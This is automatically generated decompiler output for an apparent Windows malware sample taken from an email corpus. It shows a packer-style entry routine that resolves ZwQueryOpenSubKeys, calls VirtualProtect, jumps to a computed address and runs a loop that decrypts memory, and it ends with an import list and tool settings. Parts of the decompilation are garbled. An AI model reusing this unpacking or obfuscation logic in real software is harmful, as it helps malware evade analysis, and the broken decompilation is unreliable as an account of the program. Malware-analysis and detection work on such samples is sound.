/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_2604/ia32_pe/subject.exe'
 */

/* DEST BLOCK NOT FOUND: 00410154 -> 0041004e */
/* DEST BLOCK NOT FOUND: 004101fb -> 00401077 */
/*	Procedure: 0x0041010B - 0x00410201
 *	Argument size: -16
 *	Local size: 16
 *	Save regs size: 0
 */

__entry_point__()
{
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    (save)"NTDLL.DLL";
    (save)0;
    *__imp__RealizePalette();
    (save)"ZwQueryOpenSubKeys";
    (save) *__imp__GetModuleHandleA();
    (save)0;
    (save)0;
    Vfffffffc = *( *__imp__GetProcAddress())();
    *__imp__GetTickCount();
    goto ((Vfffffffc ^ -1073741819) + 0x410156);
    *__imp__GetTickCount();
    *__imp__GetCurrentProcessId();
    (save) & Vfffffff8;
    (save)64;
    (save)61613;
    (save)0x401051;
    *__imp__GetCurrentProcessId();
    *__imp__GetCurrentProcessId();
    *__imp__VirtualProtect();
    (save)0;
    (save)167;
    (save)3;
    (save)0;
    (save)7;
    (save)0;
    (save)"ZwQueryOpenSubKeys";
    Vfffffff4 = *__imp__CreateFileA();
    (save)Vfffffff4;
    (save)0;
    *__imp__SizeofResource();
    (save)Vfffffffc;
    (save)0;
    *__imp__RealizePalette();
    Vfffffff0 = *__imp__GetCommandLineA();
    (save)61613;
    *__imp__GetCurrentThreadId();
    (save)0x401051;
    L0041021B();
    esp = ebp;
    (restore)ebp;
    *__imp__GetFileType(Vfffffff4);
    goto L00401077;
}

/* DEST BLOCK NOT FOUND: 00410217 -> 0041021b */
/*	Procedure: 0x00410202 - 0x0041021A
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00410202()
{



    *L7AC931FD :: eax;
    asm("sahf");
    (save)es;
    asm("lahf");
    bl = bl + *(edx + 124);
    esp = esp - 1;
    *edi = al;
    edi = edi + 1;
    asm("sti");
    esp = ebp;
    (restore)ebp;
    asm("jpo 0x41021b");
    asm("Unknown opcode 0xf3");
    asm("Unknown opcode 0xc7");
}

/*	Procedure: 0x0041021B - 0x00410257
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L0041021B(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    edx = A8;
    ecx = Ac >> 2;
    do {
        *edx = *edx + A10;
        *edx = *edx + 1071007111;
        *edx = *edx + A10;
        *edx = *edx - 493178035;
        *edx = *edx + A10;
        *edx = ~( *edx);
        asm("ror dword [edx],0x1e");
        edx = edx + 4;
    } while(ecx = ecx - 1);
}

/*	Procedure: 0x00410258 - 0x0041026B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00410258()
{



    al = al ^ 69;
    asm("arpl bx,di");
    asm("fist dword [eax+0x8e2a6742]");
    asm("aas");
    *(ebx * 2 + 1218044979) = *(ebx * 2 + 1218044979) | al;
    asm("xchg eax,ecx");
    (restore)esp;
}

/* address  size  */
/* 0x0041010b       0 */ /* unknown */ void 	__entry_point__;
/* 0x00411000       0 */ /* unknown */ void 	__imp__LeaveCriticalSection;
/* 0x00411004       0 */ /* unknown */ void 	__imp__GetFileInformationByHandle;
/* 0x00411008       0 */ /* unknown */ void 	__imp__FormatMessageW;
/* 0x0041100c       0 */ /* unknown */ void 	__imp__GetSystemTime;
/* 0x00411010       0 */ /* unknown */ void 	__imp__VirtualProtect;
/* 0x00411014       0 */ /* unknown */ void 	__imp__WritePrivateProfileStringA;
/* 0x00411018       0 */ /* unknown */ void 	__imp__GetSystemTimeAsFileTime;
/* 0x0041101c       0 */ /* unknown */ void 	__imp__RaiseException;
/* 0x00411020       0 */ /* unknown */ void 	__imp__VirtualAlloc;
/* 0x00411024       0 */ /* unknown */ void 	__imp__GetOEMCP;
/* 0x00411028       0 */ /* unknown */ void 	__imp__GetVersionExA;
/* 0x0041102c       0 */ /* unknown */ void 	__imp__GetACP;
/* 0x00411030       0 */ /* unknown */ void 	__imp__GetSystemDirectoryW;
/* 0x00411034       0 */ /* unknown */ void 	__imp__CloseHandle;
/* 0x00411038       0 */ /* unknown */ void 	__imp__FindNextFileW;
/* 0x0041103c       0 */ /* unknown */ void 	__imp__GetCurrentThreadId;
/* 0x00411040       0 */ /* unknown */ void 	__imp__GetCurrentProcessId;
/* 0x00411044       0 */ /* unknown */ void 	__imp__IsValidLocale;
/* 0x00411048       0 */ /* unknown */ void 	__imp__IsDebuggerPresent;
/* 0x0041104c       0 */ /* unknown */ void 	__imp__VirtualFree;
/* 0x00411050       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x00411054       0 */ /* unknown */ void 	__imp__InterlockedExchange;
/* 0x00411058       0 */ /* unknown */ void 	__imp__DisableThreadLibraryCalls;
/* 0x0041105c       0 */ /* unknown */ void 	__imp__SystemTimeToFileTime;
/* 0x00411060       0 */ /* unknown */ void 	__imp__TerminateProcess;
/* 0x00411064       0 */ /* unknown */ void 	__imp__FreeEnvironmentStringsA;
/* 0x00411068       0 */ /* unknown */ void 	__imp__InterlockedDecrement;
/* 0x0041106c       0 */ /* unknown */ void 	__imp__GetCurrentThread;
/* 0x00411070       0 */ /* unknown */ void 	__imp__GetFileAttributesA;
/* 0x00411074       0 */ /* unknown */ void 	__imp__DeleteCriticalSection;
/* 0x00411078       0 */ /* unknown */ void 	__imp__HeapReAlloc;
/* 0x0041107c       0 */ /* unknown */ void 	__imp__InitializeCriticalSection;
/* 0x00411080       0 */ /* unknown */ void 	__imp__VirtualQuery;
/* 0x00411084       0 */ /* unknown */ void 	__imp__SetUnhandledExceptionFilter;
/* 0x00411088       0 */ /* unknown */ void 	__imp__GetTickCount;
/* 0x0041108c       0 */ /* unknown */ void 	__imp__CreateThread;
/* 0x00411090       0 */ /* unknown */ void 	__imp__GetModuleHandleA;
/* 0x00411094       0 */ /* unknown */ void 	__imp__TlsSetValue;
/* 0x00411098       0 */ /* unknown */ void 	__imp__InterlockedCompareExchange;
/* 0x0041109c       0 */ /* unknown */ void 	__imp__SetThreadLocale;
/* 0x004110a0       0 */ /* unknown */ void 	__imp__GetTimeFormatA;
/* 0x004110a4       0 */ /* unknown */ void 	__imp__LocalAlloc;
/* 0x004110a8       0 */ /* unknown */ void 	__imp__FreeEnvironmentStringsW;
/* 0x004110ac       0 */ /* unknown */ void 	__imp__Sleep;
/* 0x004110b0       0 */ /* unknown */ void 	__imp__CreateFileA;
/* 0x004110b4       0 */ /* unknown */ void 	__imp__TlsAlloc;
/* 0x004110b8       0 */ /* unknown */ void 	__imp__QueryPerformanceCounter;
/* 0x004110bc       0 */ /* unknown */ void 	__imp__lstrcmpiW;
/* 0x004110c0       0 */ /* unknown */ void 	__imp__LocalFree;
/* 0x004110c4       0 */ /* unknown */ void 	__imp__SetStdHandle;
/* 0x004110c8       0 */ /* unknown */ void 	__imp__SizeofResource;
/* 0x004110cc       0 */ /* unknown */ void 	__imp__WaitForSingleObject;
/* 0x004110d0       0 */ /* unknown */ void 	__imp__GlobalAlloc;
/* 0x004110d4       0 */ /* unknown */ void 	__imp__FindResourceW;
/* 0x004110d8       0 */ /* unknown */ void 	__imp__RtlUnwind;
/* 0x004110dc       0 */ /* unknown */ void 	__imp__MultiByteToWideChar;
/* 0x004110e0       0 */ /* unknown */ void 	__imp__GetFileType;
/* 0x004110e4       0 */ /* unknown */ void 	__imp__FindClose;
/* 0x004110e8       0 */ /* unknown */ void 	__imp__GetFileAttributesW;
/* 0x004110ec       0 */ /* unknown */ void 	__imp__GetLastError;
/* 0x004110f0       0 */ /* unknown */ void 	__imp__HeapFree;
/* 0x004110f4       0 */ /* unknown */ void 	__imp__HeapDestroy;
/* 0x004110f8       0 */ /* unknown */ void 	__imp__DeleteFileW;
/* 0x004110fc       0 */ /* unknown */ void 	__imp__SetHandleCount;
/* 0x00411100       0 */ /* unknown */ void 	__imp__GetVolumeInformationW;
/* 0x00411104       0 */ /* unknown */ void 	__imp__GetCommandLineA;
/* 0x00411108       0 */ /* unknown */ void 	__imp__WriteFile;
/* 0x0041110c       0 */ /* unknown */ void 	__imp__GetModuleHandleW;
/* 0x00411110       0 */ /* unknown */ void 	__imp__HeapSize;
/* 0x00411118       0 */ /* unknown */ void 	__imp__SetViewportExtEx;
/* 0x0041111c       0 */ /* unknown */ void 	__imp__SetMapMode;
/* 0x00411120       0 */ /* unknown */ void 	__imp__PatBlt;
/* 0x00411124       0 */ /* unknown */ void 	__imp__CreateCompatibleBitmap;
/* 0x00411128       0 */ /* unknown */ void 	__imp__GetClipBox;
/* 0x0041112c       0 */ /* unknown */ void 	__imp__SetTextColor;
/* 0x00411130       0 */ /* unknown */ void 	__imp__SetROP2;
/* 0x00411134       0 */ /* unknown */ void 	__imp__RealizePalette;
/* 0x0041113c       0 */ /* unknown */ void 	__imp__GetDC;
/* 0x00411140       0 */ /* unknown */ void 	__imp__GetMenuItemCount;
/* 0x00411144       0 */ /* unknown */ void 	__imp__EndDialog;
/* 0x00411148       0 */ /* unknown */ void 	__imp__EnableWindow;
/* 0x0041114c       0 */ /* unknown */ void 	__imp__ReleaseDC;
/* 0x00411150       0 */ /* unknown */ void 	__imp__CheckMenuItem;
/* 0x00411154       0 */ /* unknown */ void 	__imp__CharNextA;
/* 0x00411158       0 */ /* unknown */ void 	__imp__GetClientRect;
/* 0x0041115c       0 */ /* unknown */ void 	__imp__DefWindowProcW;
/* 0x00411160       0 */ /* unknown */ void 	__imp__GetDlgItem;
/* 0x00411164       0 */ /* unknown */ void 	__imp__RedrawWindow;
/* 0x00411168       0 */ /* unknown */ void 	__imp__SetFocus;
/* 0x0041116c       0 */ /* unknown */ void 	__imp__CallWindowProcA;
/* 0x00411170       0 */ /* unknown */ void 	__imp__ShowWindow;
/* 0x00411174       0 */ /* unknown */ void 	__imp__PtInRect;
/* 0x00411178       0 */ /* unknown */ void 	__imp__SendDlgItemMessageA;
/* 0x0041117c       0 */ /* unknown */ void 	__imp__BeginPaint;
/* 0x00411180       0 */ /* unknown */ void 	__imp__DrawTextW;
/* 0x00411184       0 */ /* unknown */ void 	__imp__IsWindowEnabled;
/* 0x00411188       0 */ /* unknown */ void 	__imp__InvalidateRect;
/* 0x0041118c       0 */ /* unknown */ void 	__imp__ScreenToClient;
/* 0x00411190       0 */ /* unknown */ void 	__imp__SetWindowTextW;
/* 0x00411194       0 */ /* unknown */ void 	__imp__SetWindowRgn;
/* 0x00411198       0 */ /* unknown */ void 	__imp__GetNextDlgTabItem;
/* 0x0041119c       0 */ /* unknown */ void 	__imp__SendMessageW;
/* 0x004111a0       0 */ /* unknown */ void 	__imp__MapWindowPoints;
/* 0x004111a4       0 */ /* unknown */ void 	__imp__SetWindowPos;
/* 0x004111a8       0 */ /* unknown */ void 	__imp__GetWindowRect;
/* 0x004111ac       0 */ /* unknown */ void 	__imp__TrackPopupMenu;
/* 0x004111b0       0 */ /* unknown */ void 	__imp__GetWindowLongA;
/* 0x004111b4       0 */ /* unknown */ void 	__imp__wsprintfA;
/* 0x004111bc       0 */ /* unknown */ void 	__imp__exit;
/* 0x004111c0       0 */ /* unknown */ void 	__imp___wcsicmp;
/* 0x004111c4       0 */ /* unknown */ void 	__imp___initterm;
/* 0x004111c8       0 */ /* unknown */ void 	__imp__strncmp;
/* 0x004111cc       0 */ /* unknown */ void 	__imp__wcschr;
/* 0x004111d0       0 */ /* unknown */ void 	__imp___amsg_exit;
/* 0x004111d4       0 */ /* unknown */ void 	__imp__memcpy;
/* 0x004111d8       0 */ /* unknown */ void 	__imp__??1type_info;
/* 0x004111dc       0 */ /* unknown */ void 	__imp___purecall;
/* 0x004111e0       0 */ /* unknown */ void 	__imp___lock;
/* 0x004111e8       0 */ /* unknown */ void 	__imp__CoTaskMemAlloc;
/* 0x004111ec       0 */ /* unknown */ void 	__imp__CoInitialize;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
